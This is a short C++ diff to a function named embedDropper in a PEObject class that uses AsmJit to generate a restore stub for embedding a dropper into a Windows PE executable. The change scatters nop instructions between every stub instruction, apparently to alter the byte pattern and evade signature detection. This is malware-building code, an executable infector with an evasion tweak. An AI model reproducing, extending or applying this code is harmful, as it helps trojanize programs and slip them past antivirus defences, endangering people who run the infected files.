@@ -1179,26 +1179,39 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	AsmJit::Assembler restoreStub;
 	
 	restoreStub.data(&restoreVA, sizeof(DWORD));
+	restoreStub.nop();
 	restoreStub.pushfd(); // restoreVA starts here
+	restoreStub.nop();
 	restoreStub.pushad();
+	restoreStub.nop();
 
 	// save last_error
+	restoreStub.nop();
 	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+	restoreStub.nop();
 	restoreStub.mov(AsmJit::eax, dword_ptr(AsmJit::eax, 0x34));
+	restoreStub.nop();
 	restoreStub.push(AsmJit::eax);
+	restoreStub.nop();
 
 	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );
 
 	// restore last_error
+	restoreStub.nop();
 	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
+	restoreStub.nop();
 	restoreStub.pop(AsmJit::ebx);
+	restoreStub.nop();
 	restoreStub.mov(dword_ptr(AsmJit::eax, 0x34), AsmJit::ebx);
-	
+	restoreStub.nop();
 	restoreStub.popad();
+	restoreStub.nop();
 
 	// substract from retaddr before restoring flags
 	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
+	restoreStub.nop();
 	restoreStub.popfd();
+	restoreStub.nop();
 	restoreStub.ret();
 	
 	// install restore and call stub
